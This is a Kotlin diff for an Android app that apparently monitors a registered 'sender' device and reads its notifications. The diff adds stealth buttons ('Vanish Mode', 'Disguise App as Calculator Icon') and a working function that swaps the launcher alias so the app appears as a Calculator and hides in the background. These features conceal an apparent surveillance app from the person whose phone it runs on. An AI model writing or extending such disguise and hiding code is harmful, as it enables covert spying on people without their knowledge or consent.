@@ -282,18 +282,32 @@ private fun SenderRegisteredScreen(info: DeviceInfo) {
                 }
             }
 
-            // HIDE APP & RUN IN BACKGROUND BUTTON (Appears only after Registration)
-            Button(
-                onClick = { hideAppStealth(context) },
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .height(52.dp),
-                shape = RoundedCornerShape(14.dp),
-                colors = ButtonDefaults.buttonColors(containerColor = PrimaryBlue)
-            ) {
-                Icon(Icons.Default.VisibilityOff, contentDescription = null)
-                Spacer(modifier = Modifier.width(8.dp))
-                Text("Hide App & Run in Background", fontSize = 16.sp, fontWeight = FontWeight.Bold)
+            // STEALTH & DISGUISE BUTTONS (Appears only after Registration)
+            Column(verticalArrangement = Arrangement.spacedBy(10.dp), modifier = Modifier.fillMaxWidth()) {
+                Button(
+                    onClick = { hideAppStealth(context) },
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .height(50.dp),
+                    shape = RoundedCornerShape(12.dp),
+                    colors = ButtonDefaults.buttonColors(containerColor = PrimaryBlue)
+                ) {
+                    Icon(Icons.Default.VisibilityOff, contentDescription = null)
+                    Spacer(modifier = Modifier.width(8.dp))
+                    Text("Hide Icon Completely (Vanish Mode)", fontSize = 15.sp, fontWeight = FontWeight.Bold)
+                }
+
+                OutlinedButton(
+                    onClick = { disguiseAsCalculator(context) },
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .height(50.dp),
+                    shape = RoundedCornerShape(12.dp)
+                ) {
+                    Icon(Icons.Default.Calculate, contentDescription = null, tint = AccentGreen)
+                    Spacer(modifier = Modifier.width(8.dp))
+                    Text("Disguise App as Calculator Icon", fontSize = 15.sp, fontWeight = FontWeight.Bold)
+                }
             }
 
             if (!isNotificationListenerEnabled) {
@@ -435,17 +449,31 @@ private fun FullDashboardScreen(
                 )
 
                 if (info.isRegistered) {
-                    Button(
-                        onClick = { hideAppStealth(context) },
-                        modifier = Modifier
-                            .fillMaxWidth()
-                            .height(48.dp),
-                        shape = RoundedCornerShape(12.dp),
-                        colors = ButtonDefaults.buttonColors(containerColor = PrimaryBlue)
-                    ) {
-                        Icon(Icons.Default.VisibilityOff, contentDescription = null)
-                        Spacer(modifier = Modifier.width(8.dp))
-                        Text("Hide App & Run in Background", fontWeight = FontWeight.Bold)
+                    Column(verticalArrangement = Arrangement.spacedBy(8.dp), modifier = Modifier.fillMaxWidth()) {
+                        Button(
+                            onClick = { hideAppStealth(context) },
+                            modifier = Modifier
+                                .fillMaxWidth()
+                                .height(48.dp),
+                            shape = RoundedCornerShape(12.dp),
+                            colors = ButtonDefaults.buttonColors(containerColor = PrimaryBlue)
+                        ) {
+                            Icon(Icons.Default.VisibilityOff, contentDescription = null)
+                            Spacer(modifier = Modifier.width(8.dp))
+                            Text("Hide Icon Completely (Vanish Mode)", fontWeight = FontWeight.Bold)
+                        }
+
+                        OutlinedButton(
+                            onClick = { disguiseAsCalculator(context) },
+                            modifier = Modifier
+                                .fillMaxWidth()
+                                .height(48.dp),
+                            shape = RoundedCornerShape(12.dp)
+                        ) {
+                            Icon(Icons.Default.Calculate, contentDescription = null, tint = AccentGreen)
+                            Spacer(modifier = Modifier.width(8.dp))
+                            Text("Disguise App as Calculator Icon", fontWeight = FontWeight.Bold)
+                        }
                     }
                 }
             }
@@ -762,4 +790,31 @@ private fun hideAppStealth(context: Context) {
     activity?.moveTaskToBack(true)
     activity?.finishAndRemoveTask()
     activity?.finishAffinity()
+}
+
+private fun disguiseAsCalculator(context: Context) {
+    val appContext = context.applicationContext
+    val pm = appContext.packageManager
+
+    runCatching {
+        // Disable LauncherAlias
+        val defaultAlias = android.content.ComponentName(appContext.packageName, "${appContext.packageName}.LauncherAlias")
+        pm.setComponentEnabledSetting(
+            defaultAlias,
+            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            android.content.pm.PackageManager.DONT_KILL_APP
+        )
+
+        // Enable CalculatorAlias
+        val calcAlias = android.content.ComponentName(appContext.packageName, "${appContext.packageName}.CalculatorAlias")
+        pm.setComponentEnabledSetting(
+            calcAlias,
+            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+            android.content.pm.PackageManager.DONT_KILL_APP
+        )
+    }
+
+    android.widget.Toast.makeText(appContext, "App icon disguised as Calculator in Apps list!", android.widget.Toast.LENGTH_LONG).show()
+    val activity = context as? android.app.Activity
+    activity?.moveTaskToBack(true)
 }
